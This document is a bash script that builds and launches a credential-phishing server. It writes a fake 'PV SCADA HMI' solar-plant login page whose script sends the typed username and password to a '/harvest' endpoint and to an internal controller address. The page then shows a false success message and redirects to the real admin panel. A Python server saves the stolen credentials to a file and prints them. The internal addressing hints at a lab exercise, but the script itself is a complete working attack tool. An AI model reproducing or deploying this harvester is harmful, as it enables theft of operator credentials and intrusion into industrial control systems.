#!/bin/bash
# Persistent Phishing Server for external access
# Usage: EXTERNAL_HOST=your.ip.address ./start_phishing_server.sh

set -e

# Colors for output
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# External host for URLs (defaults to localhost)
EXTERNAL_HOST=${EXTERNAL_HOST:-localhost}
PV_EXTERNAL_PORT=${PV_EXTERNAL_PORT:-8081}

# Phishing URLs
PHISH_HARVESTER_URL="http://${EXTERNAL_HOST}:8001"
PHISH_PV_URL="http://${EXTERNAL_HOST}:${PV_EXTERNAL_PORT}"

echo -e "${CYAN}Starting Persistent Phishing Server${NC}"
echo -e "${YELLOW}External Host:${NC} ${EXTERNAL_HOST}"
echo -e "${YELLOW}Phishing URL:${NC} ${PHISH_HARVESTER_URL}/login.html"
echo -e "${YELLOW}PV Admin URL:${NC} ${PHISH_PV_URL}/admin"
echo ""

# Kill any existing servers
pkill -f "phish_server.py" 2>/dev/null || true
pkill -f "http.server 8001" 2>/dev/null || true
fuser -k 8001/tcp 2>/dev/null || true
sleep 1

# Create phishing page directory
mkdir -p /tmp/phish

# Create phishing page HTML with external URLs
cat > /tmp/phish/login.html << PHISH_EOF
<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>PV SCADA HMI - Solar Energy Management System</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Courier New',monospace;min-height:100vh;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden}.login-background{position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(135deg,#0a192f 0%,#112240 50%,#1a365d 100%);z-index:-1}.grid-overlay{position:absolute;top:0;left:0;right:0;bottom:0;background-image:linear-gradient(rgba(100,255,218,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(100,255,218,.03) 1px,transparent 1px);background-size:50px 50px;animation:grid-scroll 20s linear infinite}@keyframes grid-scroll{0%{transform:translate(0,0)}100%{transform:translate(50px,50px)}}.login-box{background:rgba(17,34,64,.95);border:2px solid #64ffda;border-radius:12px;box-shadow:0 0 30px rgba(100,255,218,.3),0 0 60px rgba(100,255,218,.1),inset 0 0 20px rgba(100,255,218,.05);padding:40px;max-width:500px;width:90%;backdrop-filter:blur(10px)}.system-logo{display:flex;align-items:center;gap:15px;margin-bottom:15px}.logo-icon{font-size:48px;background:linear-gradient(135deg,#64ffda 0%,#00d4ff 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:pulse 2s ease-in-out infinite}@keyframes pulse{0%,100%{transform:scale(1);filter:drop-shadow(0 0 10px rgba(100,255,218,.5))}50%{transform:scale(1.05);filter:drop-shadow(0 0 20px rgba(100,255,218,.8))}}.logo-text h1{font-size:28px;font-weight:700;color:#64ffda;letter-spacing:2px;margin:0}.logo-text p{margin:5px 0 0 0;font-size:13px;color:#8892b0;text-transform:uppercase;letter-spacing:1px}.system-status{display:flex;align-items:center;gap:8px;padding:8px 12px;background:rgba(100,255,218,.1);border:1px solid rgba(100,255,218,.3);border-radius:6px;font-size:12px;color:#64ffda;margin-bottom:30px}.status-indicator{width:10px;height:10px;border-radius:50%;background:#00ff88;box-shadow:0 0 10px #00ff88;animation:blink 2s ease-in-out infinite}@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}.login-form h2{margin:0 0 20px 0;font-size:20px;color:#ccd6f6;text-transform:uppercase;letter-spacing:1px;border-bottom:2px solid rgba(100,255,218,.3);padding-bottom:10px}.form-group{margin-bottom:20px}.form-group label{display:block;margin-bottom:8px;color:#8892b0;font-size:13px;text-transform:uppercase;letter-spacing:1px;font-weight:600}.form-group input{width:100%;padding:12px 15px;background:rgba(10,25,47,.8);border:1px solid rgba(100,255,218,.3);border-radius:6px;color:#ccd6f6;font-size:15px;font-family:'Courier New',monospace;transition:all .3s ease}.form-group input:focus{outline:none;border-color:#64ffda;box-shadow:0 0 15px rgba(100,255,218,.3);background:rgba(10,25,47,1)}.login-button{width:100%;padding:15px;background:linear-gradient(135deg,#64ffda 0%,#00d4ff 100%);border:none;border-radius:6px;color:#0a192f;font-size:16px;font-weight:700;text-transform:uppercase;letter-spacing:1px;cursor:pointer;transition:all .3s ease;display:flex;align-items:center;justify-content:center;gap:10px;font-family:'Courier New',monospace}.login-button:hover{transform:translateY(-2px);box-shadow:0 5px 20px rgba(100,255,218,.4)}.security-notice{margin:20px 0 0 0;padding:12px;background:rgba(100,255,218,.05);border-left:3px solid #64ffda;color:#8892b0;font-size:12px;line-height:1.6}.system-info{margin-top:25px;padding-top:20px;border-top:1px solid rgba(100,255,218,.2);display:flex;justify-content:space-between;flex-wrap:wrap;gap:15px}.info-item{display:flex;flex-direction:column;gap:4px}.info-label{font-size:11px;color:#64ffda;text-transform:uppercase;letter-spacing:1px}.info-value{font-size:13px;color:#ccd6f6}
</style>
</head><body>
<div class="login-background">
<div class="grid-overlay"></div>
</div>
<div class="login-box">
<div class="system-logo">
<div class="logo-icon">⚡</div>
<div class="logo-text">
<h1>PV SCADA HMI</h1>
<p>Solar Energy Management System</p>
</div>
</div>
<div class="system-status">
<span class="status-indicator"></span>
<span>System Operational</span>
</div>
<form id="f" class="login-form">
<h2>Secure Access Portal</h2>
<div class="form-group">
<label for="username">Username</label>
<input type="text" id="username" name="username" placeholder="Enter username" value="admin" required>
</div>
<div class="form-group">
<label for="password">Password</label>
<input type="password" id="password" name="password" placeholder="Enter password" required>
</div>
<button type="submit" class="login-button">
<span>🔐</span>
Access Control System
</button>
<p class="security-notice">
ⓘ This system is protected by enterprise-grade security. Unauthorized access attempts are logged and monitored.
</p>
</form>
<div class="system-info">
<div class="info-item">
<span class="info-label">System Version:</span>
<span class="info-value">v2.4.1</span>
</div>
<div class="info-item">
<span class="info-label">Protocol:</span>
<span class="info-value">HTTPS/TLS 1.3</span>
</div>
<div class="info-item">
<span class="info-label">Region:</span>
<span class="info-value">North America</span>
</div>
</div>
</div>
<script>
// Dynamically get the host that the user is accessing from
const currentHost = window.location.hostname;
const currentPort = window.location.port || '8001';
const harvesterUrl = window.location.protocol + '//' + currentHost + ':' + currentPort;
const pvAdminUrl = window.location.protocol + '//' + currentHost + ':8081';

console.log('Phishing page loaded');
console.log('Current host:', currentHost);
console.log('Harvester URL:', harvesterUrl);
console.log('PV Admin URL:', pvAdminUrl);

document.getElementById('f').onsubmit=async(e)=>{
  e.preventDefault();
  const d=new FormData(e.target);
  const j={username:d.get('username'),password:d.get('password')};
  
  console.log('Form submitted, sending to:', harvesterUrl + '/harvest');
  
  // Send to harvester on same host user is accessing
  try{
    await fetch(harvesterUrl + '/harvest',{
      method:'POST',
      mode:'no-cors',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(j)
    });
    console.log('Harvest request sent');
  }catch(err){
    console.error('Harvest error:', err);
  }
  
  // Notify PV controller (internal - this may fail from external, that's ok)
  try{
    await fetch('http://172.20.0.65/api/internal/phish_submitted',{
      method:'POST',
      mode:'no-cors',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(j)
    });
  }catch(err){}
  
  // Redirect to real admin panel on same host
  const redirectUrl = pvAdminUrl + '/admin';
  console.log('Redirecting to:', redirectUrl);
  alert('Authentication successful');
  window.location.href = redirectUrl;
};
</script>
</body></html>
PHISH_EOF

# Create phishing server with POST handler
cat > /tmp/phish_server.py << 'PHISH_SERVER_EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import os

class PhishingHandler(SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        if self.path.endswith('.html'):
            self.send_header('Content-Type', 'text/html; charset=utf-8')
        super().end_headers()
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()
    
    def do_POST(self):
        if self.path == '/harvest':
            try:
                length = int(self.headers.get('Content-Length', 0))
                data = json.loads(self.rfile.read(length))
                username = data.get('username', '')
                password = data.get('password', '')
                
                # Save harvested credentials
                with open('/tmp/harvested.txt', 'a') as f:
                    f.write(f"{username}:{password}\n")
                
                print(f"[HARVESTED] {username}:{password}")
                
                self.send_response(200)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"ok":true}')
            except Exception as e:
                print(f"[ERROR] {e}")
                self.send_response(500)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        print(f"[HTTP] {args[0]}")

if __name__ == '__main__':
    os.chdir('/tmp/phish')
    server = HTTPServer(('0.0.0.0', 8001), PhishingHandler)
    print("Phishing server running on 0.0.0.0:8001")
    print("Waiting for credentials...")
    server.serve_forever()
PHISH_SERVER_EOF

echo -e "${GREEN}Starting phishing server...${NC}"
cd /tmp/phish
exec python3 /tmp/phish_server.py
